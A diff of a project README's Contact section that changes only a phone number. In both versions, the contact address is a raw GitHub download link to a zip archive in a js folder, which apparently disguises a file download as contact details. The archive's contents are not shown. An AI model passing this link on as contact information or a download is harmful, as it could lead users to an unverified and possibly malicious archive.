@@ -144,4 +144,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## Contact
 
-For any inquiries, please contact us at [https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip](https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip) or call +254 720 215 511.
+For any inquiries, please contact us at [https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip](https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip) or call +254 796 913 123.
